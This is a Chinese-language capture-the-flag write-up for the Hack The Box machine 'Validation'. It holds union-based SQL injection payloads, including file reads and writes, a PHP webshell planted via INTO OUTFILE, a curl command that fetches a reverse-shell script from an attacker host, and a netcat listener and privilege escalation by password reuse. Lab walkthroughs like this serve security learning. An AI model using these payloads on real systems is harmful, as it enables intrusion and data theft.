# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/htb]
└─# nmap -sV -Pn 10.10.11.116 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 03:48 EST
Nmap scan report for 10.10.11.116
Host is up (0.34s latency).
Not shown: 65522 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
4566/tcp open     http           nginx
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1102.01 seconds

```

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.11.116                                                                        

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.11.116/_21-11-29_04-17-51.txt

Error Log: /root/dirsearch/logs/errors-21-11-29_04-17-51.log

Target: http://10.10.11.116/

[04:17:52] Starting:    
[04:18:57] 200 -    0B  - /config.php                                       
[04:19:00] 301 -  310B  - /css  ->  http://10.10.11.116/css/                
[04:19:16] 200 -   16KB - /index.php                                        
[04:19:17] 200 -   16KB - /index.php/login/                                 
[04:19:18] 403 -  277B  - /js/                                              
```

只有几个文件，查网页源代码无特别发现

index页面需要输入一个名字，点击确定以后会跳到另一个页面，显示我们刚才输入的名字，也就是说很可能是经过数据库的

所以会不会有sql注入？

## sql注入

用burp抓index.php页面的包，保存到data文件
```
┌──(root💀kali)-[~/htb/Validation]
└─# cat data     
POST /index.php HTTP/1.1
Host: 10.10.11.116
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.10.11.116
Connection: close
Referer: http://10.10.11.116/
Upgrade-Insecure-Requests: 1

username=max&country=Brazil

```

sqlmap尝试跑一下：
```
──(root💀kali)-[~/htb/Validation]
└─# sqlmap -r data --batch  --level=5 --risk=3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:36:41 /2021-11-29/

[09:36:41] [INFO] parsing HTTP request from 'data'
[09:36:41] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.10.11.116:80/account.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[09:36:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[09:36:42] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[09:36:44] [CRITICAL] unable to connect to the target URL
[09:36:44] [INFO] testing if the target URL content is stable
[09:36:45] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[09:36:48] [CRITICAL] unable to connect to the target URL
[09:36:48] [WARNING] POST parameter 'username' does not appear to be dynamic
[09:36:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[09:36:50] [CRITICAL] unable to connect to the target URL
[09:36:50] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[09:36:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
[09:36:51] [WARNING] your sqlmap version is outdated

[*] ending @ 09:36:51 /2021-11-29/

```


失败了。。。

经过手动测试，发现country这个参数其实是存在sql注入的，我们尝试用下面payload

> username=max&country=Andorra' 

结果报错了

> Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33

说明我们加的引号被当成了sql执行。


获得mysql版本
> username=max&country=Andorra' union select @@version -- -

返回：10.5.11-MariaDB-1


获得当前数据库名称：
> username=max&country=Andorra' union select database() -- -

返回：registration


获得当前库的所有表，表所有的库，表的行数和表的功能注释
> username=max&country=Andorra' union select concat( table_schema,char(10),table_name,char(10),table_rows,char(10),table_comment,char(10)) from information_schema.tables where table_schema=database() -- -

返回：registration registration 30 


数据库的使用者 : uhc@localhost
数据库安装路径：/var/lib/mysql/

查看/etc/passwd
> username=max&country=Andorra' union select load_file("/etc/passwd")-- -
```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting 
System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
systemd-timesync:x:101:101:systemd 
Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
systemd-network:x:102:103:systemd 
Network Management,,,:/run/systemd:/usr/sbin/nologin 
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
mysql:x:104:105:MySQL Server,,,:/nonexistent:/bin/false 
messagebus:x:105:106::/nonexistent:/usr/sbin/nologin 
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin 
```

居然没有ssh可以直接登录的普通用户

写文件到靶机
```username=max&country=Andorra' union select "<?php phpinfo(); ?>" into outfile "/var/www/html/exp.php" -- -```

成功显示phpinfo信息。

写webshell到靶机（这里我做了好多好多尝试。。。。）
```username=max&country=Andorra' union select "<?php echo system(@$_GET['cmd']); ?>" into outfile "/var/www/html/exp.php"; -- -```


我们用```{IP}/exp.php?cmd=id```触发webshell

返回：
```
uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

在```{IP}/exp.php?cmd=cat /home/htb/user.txt```拿到user.txt

## 搞个正经的webshell

但是这样的shell实在是不方便，我们使用下面的payload拿到一个交互shell

> {IP}/exp.php?cmd=curl%20 http://10.10.14.15:8000/reverse-shell.php%20 -o ./shell.php

然后访问指定文件，获得反弹shell
> {IP}//shell.php

```
┌──(root💀kali)-[~/htb/Validation]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.116] 48802
Linux validation 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 GNU/Linux
 16:55:32 up  3:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

# 提权

传linpea到靶机
> curl http://10.10.14.15:8000/linpeas.sh -o /tmp/linpeas.sh


发现有一个```cap_chown```的能力可以用于提权，但是查了半天不知道咋用

无聊去web站点看看配置文件，尝试su root，居然，成功了。。。。

```
$ cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "{这个是密码}";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
$ su
Password: {这个是密码}

id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
{就不告诉你}

```

